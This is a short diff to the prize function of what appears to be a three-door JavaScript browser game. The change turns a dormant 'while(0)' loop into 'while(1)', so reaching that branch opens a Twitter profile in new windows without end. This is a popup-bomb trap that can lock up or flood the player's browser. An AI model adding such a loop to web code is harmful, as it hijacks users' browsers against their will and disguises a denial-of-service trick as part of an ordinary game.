@@ -117,7 +117,7 @@ function premio(random) {
         portas.p1.img.src="";
         portas.p2.img.src="";
         portas.p3.img.src="";
-        while(0){
+        while(1){
             window.open('https://twitter.com/OtavioJr08');
         }
     }
